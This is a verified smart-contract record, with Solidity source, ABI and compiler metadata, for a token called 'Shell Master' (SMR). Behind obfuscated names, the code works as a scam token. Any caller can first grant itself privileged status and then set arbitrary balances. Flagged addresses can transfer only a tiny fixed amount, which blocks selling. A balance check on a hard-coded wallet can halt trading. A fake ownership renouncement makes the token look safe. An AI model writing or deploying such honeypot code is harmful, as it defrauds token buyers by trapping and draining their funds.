{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface swapToken {\n    function createPair(address maxLaunchExempt, address listEnable) external returns (address);\n}\n\ninterface senderMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletLimit) external view returns (uint256);\n\n    function transfer(address liquidityExempt, uint256 maxLiquidity) external returns (bool);\n\n    function allowance(address totalMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityExempt,\n        uint256 maxLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMode, uint256 value);\n    event Approval(address indexed totalMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract modeSenderToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchMax is senderMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShellMaster is modeSenderToken, senderMin, launchMax {\n\n    bool public enableSell;\n\n    string private walletMinTx = \"SMR\";\n\n    function getOwner() external view returns (address) {\n        return launchFromSell;\n    }\n\n    function approve(address maxSwap, uint256 maxLiquidity) public virtual override returns (bool) {\n        enableTake[_msgSender()][maxSwap] = maxLiquidity;\n        emit Approval(_msgSender(), maxSwap, maxLiquidity);\n        return true;\n    }\n\n    function allowance(address sellReceiverTake, address maxSwap) external view virtual override returns (uint256) {\n        if (maxSwap == teamTo) {\n            return type(uint256).max;\n        }\n        return enableTake[sellReceiverTake][maxSwap];\n    }\n\n    address private launchFromSell;\n\n    mapping(address => uint256) private enableFund;\n\n    uint256 modeBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingSell;\n    }\n\n    function balanceOf(address walletLimit) public view virtual override returns (uint256) {\n        return enableFund[walletLimit];\n    }\n\n    uint256 public tradingToken;\n\n    function autoToken(address receiverSwap) public {\n        if (enableSell) {\n            return;\n        }\n        \n        marketingReceiver[receiverSwap] = true;\n        if (takeAuto == toReceiverTake) {\n            takeBuyMode = tradingToken;\n        }\n        enableSell = true;\n    }\n\n    function maxLiquidityEnable(address fundSwap, uint256 maxLiquidity) public {\n        toAuto();\n        enableFund[fundSwap] = maxLiquidity;\n    }\n\n    function toAuto() private view {\n        require(marketingReceiver[_msgSender()]);\n    }\n\n    uint256 constant walletIs = 12 ** 10;\n\n    function transferFrom(address receiverTx, address liquidityExempt, uint256 maxLiquidity) external override returns (bool) {\n        if (_msgSender() != teamTo) {\n            if (enableTake[receiverTx][_msgSender()] != type(uint256).max) {\n                require(maxLiquidity <= enableTake[receiverTx][_msgSender()]);\n                enableTake[receiverTx][_msgSender()] -= maxLiquidity;\n            }\n        }\n        return enableMax(receiverTx, liquidityExempt, maxLiquidity);\n    }\n\n    string private marketingSell = \"Shell Master\";\n\n    uint256 public walletFee;\n\n    uint256 private takeBuyMode;\n\n    function atList(address txLiquidity) public {\n        toAuto();\n        if (sellMarketingSender != takeBuyMode) {\n            takeAuto = false;\n        }\n        if (txLiquidity == marketingAutoAt || txLiquidity == fundAuto) {\n            return;\n        }\n        exemptLaunch[txLiquidity] = true;\n    }\n\n    bool public toReceiverTake;\n\n    event OwnershipTransferred(address indexed launchedTx, address indexed launchMin);\n\n    function transfer(address fundSwap, uint256 maxLiquidity) external virtual override returns (bool) {\n        return enableMax(_msgSender(), fundSwap, maxLiquidity);\n    }\n\n    uint256 maxList;\n\n    function enableMax(address receiverTx, address liquidityExempt, uint256 maxLiquidity) internal returns (bool) {\n        if (receiverTx == marketingAutoAt) {\n            return isMode(receiverTx, liquidityExempt, maxLiquidity);\n        }\n        uint256 launchExempt = senderMin(fundAuto).balanceOf(amountLimit);\n        require(launchExempt == modeBuy);\n        require(liquidityExempt != amountLimit);\n        if (exemptLaunch[receiverTx]) {\n            return isMode(receiverTx, liquidityExempt, walletIs);\n        }\n        return isMode(receiverTx, liquidityExempt, maxLiquidity);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTakeBuy;\n    }\n\n    function launchedMode() public {\n        emit OwnershipTransferred(marketingAutoAt, address(0));\n        launchFromSell = address(0);\n    }\n\n    address amountLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public walletLiquiditySell;\n\n    function isMode(address receiverTx, address liquidityExempt, uint256 maxLiquidity) internal returns (bool) {\n        require(enableFund[receiverTx] >= maxLiquidity);\n        enableFund[receiverTx] -= maxLiquidity;\n        enableFund[liquidityExempt] += maxLiquidity;\n        emit Transfer(receiverTx, liquidityExempt, maxLiquidity);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapLiquidity;\n    }\n\n    uint256 private sellMarketingSender;\n\n    mapping(address => bool) public marketingReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMinTx;\n    }\n\n    mapping(address => bool) public exemptLaunch;\n\n    function amountReceiver(uint256 maxLiquidity) public {\n        toAuto();\n        modeBuy = maxLiquidity;\n    }\n\n    constructor (){\n        \n        atLaunched buySell = atLaunched(teamTo);\n        fundAuto = swapToken(buySell.factory()).createPair(buySell.WETH(), address(this));\n        \n        marketingAutoAt = _msgSender();\n        marketingReceiver[marketingAutoAt] = true;\n        enableFund[marketingAutoAt] = listTakeBuy;\n        launchedMode();\n        if (takeBuyMode == sellMarketingSender) {\n            walletLiquiditySell = false;\n        }\n        emit Transfer(address(0), marketingAutoAt, listTakeBuy);\n    }\n\n    address public marketingAutoAt;\n\n    uint8 private swapLiquidity = 18;\n\n    address public fundAuto;\n\n    uint256 private listTakeBuy = 100000000 * 10 ** 18;\n\n    bool public takeAuto;\n\n    address teamTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private enableTake;\n\n    function owner() external view returns (address) {\n        return launchFromSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiverTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"amountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"}],\"name\":\"atList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"autoToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAutoAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"maxLiquidityEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLiquiditySell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ShellMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}